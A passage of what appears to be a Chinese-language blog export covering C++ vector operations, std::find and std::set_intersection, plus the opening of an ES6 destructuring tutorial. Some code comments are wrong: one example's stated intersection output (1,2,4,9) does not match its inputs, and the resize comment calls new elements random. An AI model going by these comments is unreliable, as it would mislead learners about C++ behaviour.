<h4 id="1-3-vector-对象的常用内置函数使用（举例说明）"><a href="#1-3-vector-对象的常用内置函数使用（举例说明）" class="headerlink" title="1.3 vector 对象的常用内置函数使用（举例说明）"></a>1.3 vector 对象的常用内置函数使用（举例说明）</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; a,b;</span><br><span class="line"><span class="comment">//b为向量，将b的0-2个元素赋值给向量a</span></span><br><span class="line">a.<span class="built_in">assign</span>(b.<span class="built_in">begin</span>(),b.<span class="built_in">begin</span>()+<span class="number">3</span>);</span><br><span class="line"><span class="comment">//a含有4个值为2的元素</span></span><br><span class="line">a.<span class="built_in">assign</span>(<span class="number">4</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//返回a的最后一个元素</span></span><br><span class="line">a.<span class="built_in">back</span>();</span><br><span class="line"><span class="comment">//返回a的第一个元素</span></span><br><span class="line">a.<span class="built_in">front</span>();</span><br><span class="line"><span class="comment">//返回a的第i元素,当且仅当a存在</span></span><br><span class="line">a[i];</span><br><span class="line"><span class="comment">//清空a中的元素</span></span><br><span class="line">a.<span class="built_in">clear</span>();</span><br><span class="line"><span class="comment">//判断a是否为空，空则返回true，非空则返回false</span></span><br><span class="line">a.<span class="built_in">empty</span>();</span><br><span class="line"><span class="comment">//删除a向量的最后一个元素</span></span><br><span class="line">a.<span class="built_in">pop_back</span>();</span><br><span class="line"><span class="comment">//删除a中第一个（从第0个算起）到第二个元素，也就是说删除的元素从a.begin()+1算起（包括它）一直到a.begin()+3（不包括它）结束</span></span><br><span class="line">a.<span class="built_in">erase</span>(a.<span class="built_in">begin</span>()+<span class="number">1</span>,a.<span class="built_in">begin</span>()+<span class="number">3</span>);</span><br><span class="line"><span class="comment">//在a的最后一个向量后插入一个元素，其值为5</span></span><br><span class="line">a.<span class="built_in">push_back</span>(<span class="number">5</span>);</span><br><span class="line"><span class="comment">//在a的第一个元素（从第0个算起）位置插入数值5,</span></span><br><span class="line">a.<span class="built_in">insert</span>(a.<span class="built_in">begin</span>()+<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="comment">//在a的第一个元素（从第0个算起）位置插入3个数，其值都为5</span></span><br><span class="line">a.<span class="built_in">insert</span>(a.<span class="built_in">begin</span>()+<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>);</span><br><span class="line"><span class="comment">//b为数组，在a的第一个元素（从第0个元素算起）的位置插入b的第三个元素到第5个元素（不包括b+6）</span></span><br><span class="line">a.<span class="built_in">insert</span>(a.<span class="built_in">begin</span>()+<span class="number">1</span>,b+<span class="number">3</span>,b+<span class="number">6</span>);</span><br><span class="line"><span class="comment">//返回a中元素的个数</span></span><br><span class="line">a.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//返回a在内存中总共可以容纳的元素个数</span></span><br><span class="line">a.<span class="built_in">capacity</span>();</span><br><span class="line"><span class="comment">//将a的现有元素个数调整至10个，多则删，少则补，其值随机</span></span><br><span class="line">a.<span class="built_in">resize</span>(<span class="number">10</span>);</span><br><span class="line"><span class="comment">//将a的现有元素个数调整至10个，多则删，少则补，其值为2</span></span><br><span class="line">a.<span class="built_in">resize</span>(<span class="number">10</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//将a的容量扩充至100，</span></span><br><span class="line">a.<span class="built_in">reserve</span>(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//b为向量，将a中的元素和b中的元素整体交换</span></span><br><span class="line">a.<span class="built_in">swap</span>(b);</span><br><span class="line"><span class="comment">//b为向量，向量的比较操作还有 != &gt;= &gt; &lt;= &lt;</span></span><br><span class="line">a==b;</span><br></pre></td></tr></table></figure>

<h2 id="2-顺序访问-vector-的几种方式，举例说明"><a href="#2-顺序访问-vector-的几种方式，举例说明" class="headerlink" title="2. 顺序访问 vector 的几种方式，举例说明"></a>2. 顺序访问 vector 的几种方式，举例说明</h2><h4 id="2-1-对向量-a-添加元素的几种方式"><a href="#2-1-对向量-a-添加元素的几种方式" class="headerlink" title="2.1. 对向量 a 添加元素的几种方式"></a>2.1. 对向量 a 添加元素的几种方式</h4><p>1.向向量 a 中添加元素</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;a;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;++i)&#123;a.<span class="built_in">push_back</span>(i);&#125;</span><br></pre></td></tr></table></figure>

<p>2.从数组中选择元素向向量中添加</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">6</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; b;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">4</span>;++i)&#123;b.<span class="built_in">push_back</span>(a[i]);&#125;</span><br></pre></td></tr></table></figure>

<p>3.从现有向量中选择元素向向量中添加</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">6</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;b;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">c</span>(a,a+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it=c.<span class="built_in">begin</span>();it&lt;c.<span class="built_in">end</span>();++it)</span><br><span class="line">&#123;</span><br><span class="line">	b.<span class="built_in">push_back</span>(*it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.从文件中读取元素向向量中添加</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">in</span><span class="params">(<span class="string">&quot;data.txt&quot;</span>)</span></span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;a;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i;in&gt;&gt;i)&#123;a.<span class="built_in">push_back</span>(i);&#125;</span><br></pre></td></tr></table></figure>

<p>5.常见错误赋值方式</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;a;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;++i)&#123;a[i]=i;&#125;<span class="comment">//下标只能用来获取已经存在的元素</span></span><br></pre></td></tr></table></figure>

<p>2.2 从向量中读取元素</p>
<p>1.通过下标方式获取</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">6</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">b</span>(a,a+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=b.<span class="built_in">size</span>()<span class="number">-1</span>;++i)&#123;cout&lt;&lt;b[i]&lt;&lt;endl;&#125;</span><br></pre></td></tr></table></figure>

<p>2.通过迭代器方式读取</p>
<p>2.通过迭代器方式读取</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">6</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">b</span>(a,a+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it=b.<span class="built_in">begin</span>();it!=b.<span class="built_in">end</span>();it++)&#123;cout&lt;&lt;*it&lt;&lt;<span class="string">&quot;  &quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-几个常用的算法"><a href="#3-几个常用的算法" class="headerlink" title="3.几个常用的算法"></a>3.几个常用的算法</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="comment">//对a中的从a.begin()（包括它）到a.end()（不包括它）的元素进行从小到大排列</span></span><br><span class="line"><span class="built_in">sort</span>(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>());</span><br><span class="line"><span class="comment">//对a中的从a.begin()（包括它）到a.end()（不包括它）的元素倒置，但不排列，如a中元素为1,3,2,4,倒置后为4,2,3,1</span></span><br><span class="line"><span class="built_in">reverse</span>(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>());</span><br><span class="line"> <span class="comment">//把a中的从a.begin()（包括它）到a.end()（不包括它）的元素复制到b中，从b.begin()+1的位置（包括它）开始复制，覆盖掉原有元素</span></span><br><span class="line"><span class="built_in">copy</span>(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>(),b.<span class="built_in">begin</span>()+<span class="number">1</span>);</span><br><span class="line"><span class="comment">//在a中的从a.begin()（包括它）到a.end()（不包括它）的元素中查找10，若存在返回其在向量中的位置</span></span><br><span class="line"> <span class="built_in">find</span>(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>(),<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<h2 id="find-使用"><a href="#find-使用" class="headerlink" title="find 使用"></a>find 使用</h2><p>不同于 map（map 有 find 方法），vector 本身是没有 find 这一方法，其 find 是依靠 algorithm 来实现的。</p>
<p>话不多说，上代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">   vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line"></span><br><span class="line">   vec.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">   vec.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">   vec.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">   vec.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">   vec.<span class="built_in">push_back</span>(<span class="number">5</span>);</span><br><span class="line">   vec.<span class="built_in">push_back</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">   vector&lt;<span class="type">int</span>&gt;::iterator it = <span class="built_in">find</span>(vec.<span class="built_in">begin</span>(), vec.<span class="built_in">end</span>(), <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (it != vec.<span class="built_in">end</span>())</span><br><span class="line">       cout&lt;&lt;*it&lt;&lt;endl;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       cout&lt;&lt;<span class="string">&quot;can not find&quot;</span>&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>记着要包含 algorithm 这一头文件，其定义了 find 这一函数。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++集合操作之集合交集：stdset_intersection</title>
    <url>/2021/05/15/C++%E9%9B%86%E5%90%88%E6%93%8D%E4%BD%9C%E4%B9%8B%E9%9B%86%E5%90%88%E4%BA%A4%E9%9B%86%EF%BC%9Astdset_intersection/</url>
    <content><![CDATA[<h1 id="C-集合操作之集合交集：std-set-intersection"><a href="#C-集合操作之集合交集：std-set-intersection" class="headerlink" title="C++集合操作之集合交集：std::set_intersection"></a>C++集合操作之集合交集：std::set_intersection</h1><p>算法 set_intersection 可以用来求两个集合的交集，此处的集合可以为 std::set，也可以是 std::multiset，但是不可以是 hash_set 以及 hash_multiset。为什么呢？因为 set_intersection 要求两个区间必须是有序的（从小到大排列），std::set 和 std::multiset 为有序序列，而 hash_set 以及 hash_multiset 为无序序列。</p>
<p>由于两个集合内的每个元素都不需唯一，因此，如果某个值在区间 1 中出现 m 次，在区间 2 中出现 n 次，那么该值在输出区间中会出现 min(m,n)次，且全部来自于区间 1.函数返回值为一个迭代器，指向输出区间的尾部。</p>
<p>set_intersection 为稳定操作，即输出区间内的每个元素的相对顺序都和区间 1 内的相对顺序相同。</p>
<p>一定谨记：两个区间必须是有序区间（从小到大）</p>
<p>源码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> InputIterator1,<span class="keyword">class</span> InputIterator2,<span class="keyword">class</span> OutputIterator&gt;</span></span><br><span class="line"><span class="function">OutputIterator <span class="title">set_intersection</span><span class="params">(InputIterator1 first1,InputIterator1 last1,InputIterator2 first2,InputIterator2 last2,OutputIterator result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (first1!=last1 &amp;&amp; first2!=last2) <span class="comment">//若均未到达尾端，则进行以下操作</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//在两个区间内分别移动迭代器。若二者值相同用result记录该值，移动first1,first2和result</span></span><br><span class="line">		<span class="comment">//若first1较小，则移动first1，其他不动</span></span><br><span class="line">		<span class="comment">//若first2较小，则移动first2，其他不动</span></span><br><span class="line">		<span class="keyword">if</span> (*first1&lt;*first2)</span><br><span class="line">			first1++;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (*first2&lt;*first1)</span><br><span class="line">			first2++;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			*result=*first1;</span><br><span class="line">			first1++;</span><br><span class="line">			first2++;</span><br><span class="line">			result++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> iarr1[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>&#125;;</span><br><span class="line">	<span class="type">int</span> iarr2[]=&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">	<span class="function">multiset&lt;<span class="type">int</span>&gt; <span class="title">iset1</span><span class="params">(begin(iarr1),end(iarr1))</span></span>;</span><br><span class="line">	<span class="function">multiset&lt;<span class="type">int</span>&gt; <span class="title">iset2</span><span class="params">(begin(iarr2),end(iarr2))</span></span>;</span><br><span class="line">	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ivec</span><span class="params">(<span class="number">20</span>)</span></span>;</span><br><span class="line">	<span class="keyword">auto</span> iter=<span class="built_in">set_intersection</span>(iset1.<span class="built_in">begin</span>(),iset1.<span class="built_in">end</span>(),iset2.<span class="built_in">begin</span>(),iset2.<span class="built_in">end</span>(),ivec.<span class="built_in">begin</span>());	<span class="comment">//ivec为：1,3,4,9</span></span><br><span class="line">	ivec.<span class="built_in">resize</span>(iter-ivec.<span class="built_in">begin</span>());<span class="comment">//重新确定ivec大小</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实 ，上述代码并不仅限于对两个集合取交集，只要是两个有序区间，均可以用此代码求交集。</p>
<p>用于非 set 场合：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> iarr1[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="type">int</span> iarr2[]=&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">9</span>&#125;;</span><br><span class="line">	std::<span class="built_in">sort</span>(<span class="built_in">begin</span>(iarr1),<span class="built_in">end</span>(iarr1));</span><br><span class="line">	std::<span class="built_in">sort</span>(<span class="built_in">begin</span>(iarr2),<span class="built_in">end</span>(iarr2));</span><br><span class="line">	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ivec</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="keyword">auto</span> iter=<span class="built_in">set_intersection</span>(<span class="built_in">begin</span>(iarr1),<span class="built_in">end</span>(iarr1),<span class="built_in">begin</span>(iarr2),<span class="built_in">end</span>(iarr2),ivec.<span class="built_in">begin</span>());	<span class="comment">//ivec为：1,2,4,9</span></span><br><span class="line">	ivec.<span class="built_in">resize</span>(iter-ivec.<span class="built_in">begin</span>());<span class="comment">//重新确定ivec大小</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>ES6解构赋值</title>
    <url>/2021/06/21/ES6%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</url>
    <content><![CDATA[<p>转载文章：<a href="https://www.cnblogs.com/xiaohuochai/p/7243166.html">ES6 解构赋值</a><br>入门视频：<a href="https://www.bilibili.com/video/BV16k4y117YR">快速入坑 ES6（3）：变量解构赋值与应用场景</a></p>
<h1 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h1><p>我们经常定义许多对象和数组，然后有组织地从中提取相关的信息片段。在 ES6 中添加了可以简化这种任务的新特性：解构。解构是一种打破数据结构，将其拆分为更小部分的过程。本文将详细介绍 ES6 解构赋值。<br>解构赋值应用：有函数参数、函数返回值、变量互换、JSON 应用、Ajax 请求应用等。<br>比如说 axios 应用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从axios返回的对象结构的数据中去除data属性，并将其改名为res</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">data</span>: res &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">$axios</span>.<span class="title function_">get</span>(<span class="string">&quot;url&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>在 ES5 中，开发者们为了从对象和数组中获取特定数据并赋值给变量，编写了许多看起来同质化的代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> options = &#123;</span><br><span class="line">  <span class="attr">repeat</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">save</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 从对象中提取数据</span></span><br><span class="line"><span class="keyword">let</span> repeat = options.<span class="property">repeat</span>,</span><br><span class="line">  save = options.<span class="property">save</span>;</span><br></pre></td></tr></table></figure>

<p>这段代码从 options 对象中提取 repeat 和 save 的值，并将其存储为同名局部变量，提取的过程极为相似<br>　　如果要提取更多变量，则必须依次编写类似的代码来为变量赋值，如果其中还包含嵌套结构，只靠遍历是找不到真实信息的，必须要深入挖掘整个数据结构才能找到所需数据<br>　　所以 ES6 添加了解构功能，将数据结构打散的过程变得更加简单，可以从打散后更小的部分中获取所需信息</p>
<h2 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h2><p>对象字面量的语法形式是在一个赋值操作符左边放置一个对象字面量</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; type, name &#125; = node;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(type); <span class="comment">// &quot;Identifier&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这段代码中，node.type 的值被存储在名为 type 的变量中；node.name 的值被存储在名为 name 的变量中</p>
<h3 id="【解构赋值】"><a href="#【解构赋值】" class="headerlink" title="【解构赋值】"></a>【解构赋值】</h3><p>到目前为止，我们已经将对象解构应用到了变量的声明中。然而，我们同样可以在给变量赋值时使用解构语法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  type = <span class="string">&quot;Literal&quot;</span>,</span><br><span class="line">  name = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// 使用解构来分配不同的值</span></span><br><span class="line">(&#123; type, name &#125; = node);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(type); <span class="comment">// &quot;Identifier&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，声明变量 type 和 name 时初始化了一个值，在后面几行中，通过解构赋值的方法，从 node 对象读取相应的值重新为这两个变量赋值<br>　　[注意]一定要用一对小括号包裹解构赋值语句，JS 引擎将一对开放的花括号视为一个代码块。语法规定，代码块语句不允许出现在赋值语句左侧，添加小括号后可以将块语句转化为一个表达式，从而实现整个解构赋值过程<br>　　解构赋值表达式的值与表达式右侧(也就是&#x3D;右侧)的值相等，如此一来，在任何可以使用值的地方都可以使用解构赋值表达式</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  type = <span class="string">&quot;Literal&quot;</span>,</span><br><span class="line">  name = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">outputInfo</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value === node); <span class="comment">// true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">outputInfo</span>((&#123; type, name &#125; = node));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(type); <span class="comment">// &quot;Identifier&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>

<p>调用 outputlnfo()函数时传入了一个解构表达式，由于 JS 表达式的值为右侧的值，因而此处传入的参数等同于 node，且变量 type 和 name 被重新赋值，最终将 node 传入 outputlnfo()函数<br>　　[注意]解构赋值表达式(也就是&#x3D;右侧的表达式)如果为 null 或 undefined 会导致程序抛出错误。也就是说，任何尝试读取 null 或 undefined 的属性的行为都会触发运行时错误</p>
<h3 id="【默认值】"><a href="#【默认值】" class="headerlink" title="【默认值】"></a>【默认值】</h3><p>使用解构赋值表达式时，如果指定的局部变量名称在对象中不存在，那么这个局部变量会被赋值为 undefined</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; type, name, value &#125; = node;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(type); <span class="comment">// &quot;Identifier&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// &quot;foo&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>这段代码额外定义了一个局部变量 value，然后尝试为它赋值，然而在 node 对象上，没有对应名称的属性值，所以像预期中的那样将它赋值为 undefined<br>　　当指定的属性不存在时，可以随意定义一个默认值，在属性名称后添加一个等号(&#x3D;)和相应的默认值即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; type, name, value = <span class="literal">true</span> &#125; = node;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(type); <span class="comment">// &quot;Identifier&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// &quot;foo&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>在此示例中，为变量 value 设置了默认值 true，只有当 node 上没有该属性或者该属性值为 undefined 时该值才生效。此处没有 node.value 属性，因为 value 使用了预设的默认值</p>
<h3 id="【为非同名局部变量赋值-改名-】"><a href="#【为非同名局部变量赋值-改名-】" class="headerlink" title="【为非同名局部变量赋值(改名)】"></a>【为非同名局部变量赋值(改名)】</h3><p>如果希望使用不同命名的局部变量来存储对象属性的值，ES6 中的一个扩展语法可以满足需求，这个语法与完整的对象字面量属性初始化程序的很像</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">type</span>: localType, <span class="attr">name</span>: localName &#125; = node;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(localType); <span class="comment">// &quot;Identifier&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(localName); <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>

<p>这段代码使用了解构赋值来声明变量 localType 和 localName，这两个变量分别包含 node.type 和 node.name 属性的值。type:localType 语法的含义是读取名为 type 的属性并将其值存储在变量 localType 中，这种语法实际上与传统对象字面量的语法相悖，原来的语法名称在冒号左边，值在右边；现在值在冒号右边，而对象的属性名在左边<br>　　当使用其他变量名进行赋值时也可以添加默认值，只需在变量名后添加等号和默认值即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">type</span>: localType, <span class="attr">name</span>: localName = <span class="string">&quot;bar&quot;</span> &#125; = node;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(localType); <span class="comment">// &quot;Identifier&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(localName); <span class="comment">// &quot;bar&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这段代码中，由于 node.name 属性不存在，变量被默认赋值为”bar”</p>
<h3 id="【嵌套对象解构】"><a href="#【嵌套对象解构】" class="headerlink" title="【嵌套对象解构】"></a>【嵌套对象解构】</h3><p>解构嵌套对象仍然与对象字面量的语法相似，可以将对象拆解以获取想要的信息</p>
